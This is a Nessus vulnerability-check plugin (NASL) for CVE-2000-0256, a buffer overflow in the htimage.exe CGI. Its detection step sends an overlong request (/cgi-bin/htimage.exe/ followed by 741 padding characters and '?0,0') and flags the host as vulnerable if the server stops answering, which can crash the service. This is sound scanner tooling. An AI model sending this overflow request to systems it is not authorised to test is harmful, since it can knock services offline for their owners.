#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
#
# See the Nessus Scripts License for details
#
# Added some extra checks. Axel Nennker axel@nennker.de

if(description)
{
 script_id(10376);
 script_bugtraq_id(1117);
 script_version ("$Revision: 1.28 $");
 script_cve_id("CVE-2000-0256");

 name["english"] = "htimage.exe overflow";

 script_name(english:name["english"]);
 
 # Description
 desc["english"] = "
There is a buffer overflow in the remote
htimage.exe cgi when it is given the request :

/cgi-bin/htimage.exe/AAAA[....]AAA?0,0

An attacker may use it to execute arbitrary code
on this host.

Solution : delete it
Risk factor : High";

 script_description(english:desc["english"]);

 # Summary
 summary["english"] = "Is htimage.exe vulnerable to a buffer overflow ?";
 script_summary(english:summary["english"]);

 # Category
 script_category(ACT_DENIAL);

 # Dependencie(s)
 script_dependencie("find_service.nes", "no404.nasl");
 
 # Family
 family["english"] = "Web Servers";
 script_family(english:family["english"]);
 
 # Copyright
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison");
 
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# The attack starts here
include("http_func.inc");
include("http_keepalive.inc");



port = get_http_port(default:80);

if(!get_port_state(port))exit(0);


if(http_is_dead(port:port))exit(0);

foreach dir (cgi_dirs())
{
 if(is_cgi_installed_ka(item:string(dir, "/htimage.exe"), port:port))
 {
  req = string(dir, "/htimage.exe/", crap(741), "?0,0");
  soc = http_open_socket(port);
  if(soc)
  {
  req = http_get(item:req, port:port);
  send(socket:soc, data:req);
  r = http_recv(socket:soc);
  if(!r)
   {
    security_hole(port);
   }
  }
 exit(0);
 }
}


